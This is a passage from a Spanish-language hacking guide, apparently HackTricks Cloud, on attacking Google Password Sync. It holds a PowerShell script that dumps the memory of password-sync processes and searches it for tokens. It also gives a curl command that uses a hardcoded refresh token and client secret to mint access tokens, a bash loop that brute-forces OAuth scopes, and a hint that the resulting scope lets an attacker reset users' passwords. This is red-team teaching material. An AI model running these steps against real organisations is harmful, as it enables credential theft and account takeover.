if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Generando tokens de acceso a partir de tokens de actualizaci칩n

Usando el token de actualizaci칩n, es posible generar tokens de acceso utilizando este y el ID de cliente y el secreto de cliente especificados en el siguiente comando:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
Tenga en cuenta que incluso teniendo un token de actualizaci칩n, no es posible solicitar ning칰n alcance para el token de acceso, ya que solo puede solicitar los **alcances admitidos por la aplicaci칩n donde est치 generando el token de acceso**.

Adem치s, el token de actualizaci칩n no es v치lido en todas las aplicaciones.
{% endhint %}

Por defecto, GPS no tendr치 acceso como el usuario a todos los posibles alcances de OAuth, por lo que utilizando el siguiente script podemos encontrar los alcances que se pueden usar con el `refresh_token` para generar un `access_token`:

<details>

<summary>Script Bash para fuerza bruta de alcances</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Y esta es la salida que obtuve en el momento de la escritura:
```
https://www.googleapis.com/auth/admin.directory.user
```
Lo mismo que obtienes si no indicas ning칰n alcance.

{% hint style="danger" %}
Con este alcance podr칤as **modificar la contrase침a de un usuario existente para escalar privilegios**.
{% endhint %}

## Referencias

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**repos de HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
